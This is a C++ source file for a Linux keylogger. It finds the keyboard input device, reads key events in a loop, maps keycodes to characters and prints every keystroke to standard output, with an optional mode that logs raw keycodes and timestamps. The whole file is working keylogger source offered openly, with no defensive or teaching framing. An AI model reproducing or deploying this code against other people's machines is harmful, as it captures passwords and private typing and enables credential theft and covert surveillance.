/*
 * =====================================================================================
 *
 *       Filename:  keylog.cpp
 *
 *    Description: A linux keylogger reading from the user space. 
 *
 *        Version:  1.0
 *        Created:  13/03/11 11:43:12
 *       Revision:  none
 *       Compiler:  g++
 *
 *         Author:  José M. González (imasen, txemagon), txema.gonz@gmail.com
 *        Company:  nova Web Studio. http://www.novaws.es
 *
 * =====================================================================================
 */

#include <stdlib.h>
#include "logger.h"
#include "kb_device.h"
#include <unistd.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <linux/input.h>
#include <stdio.h>
#include <signal.h>
#include "mapper.h"
#include <locale.h>
#include "keylog.h"

#define	STR_LEN 0x20		/* Max length of names in this file */
#define	BUFFER_SIZE 0x100	/* Size of event buffer */

#define	MAPFILE "keycodes.map"	/* File mapping between keycodes and chars */

int kb_fd = -1;			/* Device file descriptor */


/* 
 * ===  FUNCTION  ======================================================================
 *         Name:  signal_handler
 *  Description:  Exit from the program.
 * =====================================================================================
 */
void
signal_handler (int sig_num)
{
  fprintf (stderr, "\nSignal received (%i). Exiting.\n", sig_num);
  close (kb_fd);
#ifndef  SHOWKEYCODES
  unload_map ();
#endif /* -----  not SHOWKEYCODES  ----- */
  exit (0);
}				/* -----  end of function signal_handler  ----- */


/* 
 * ===  FUNCTION  ======================================================================
 *         Name:  read_keys
 *  Description:  Buffered input keyboard events.
 * =====================================================================================
 */
void
read_keys ()
{
  struct input_event event[64];
  int ev_num;			/* Number events read. */

  // Read data and check for an integer number of events
  ev_num = read (kb_fd, event, sizeof (event));
  if (ev_num % sizeof (struct input_event) != 0)
    exit_because_error ("Problems reading the event.", -3);

  ev_num /= sizeof (struct input_event);	// Units: bytes -> Events
  for (int i = 0; i < ev_num; i++)
    if (event[i].type == EV_KEY)
      {

#ifdef  SHOWKEYCODES
	double sec = event[i].time.tv_sec + event[i].time.tv_usec / 1000000.;
	printf ("%.6lf\t%i\t%i\n", sec, event[i].code, event[i].value);
#else /* -----  not SHOWKEYCODES  ----- */
	printf ("%s", dispatch_kc (event[i].code - 1, event[i].value));
	fflush (stdout);
#endif /* -----  not SHOWKEYCODES  ----- */
      }
}				/* -----  end of function read_keys  ----- */

/* 
 * ===  FUNCTION  ======================================================================
 *         Name:  start_logging
 *  Description:  Finds the keyboard input device and logs the input.
 * =====================================================================================
 */
void
start_logging ()
{
  char dev_name[STR_LEN];
  int signals = 25;

#ifndef  SHOWKEYCODES
  load_map (MAPFILE);
#endif /* -----  not SHOWKEYCODES  ----- */
  // Load the map

  if ((kb_fd = open_keyboard_device ()) == -1)
    exit_because ("Keyboard device not found.", -2);

  ioctl (kb_fd, EVIOCGNAME (sizeof (dev_name)), dev_name);
  fprintf (stderr, "\nStart logging from (%s).\n", dev_name);

  // handle all singles so the device will be closed before exit
  while (signals--)
    signal (signals, &signal_handler);

  while (1)
    read_keys ();

  close (kb_fd);

}				/* ----------  end of function start logging  ---------- */
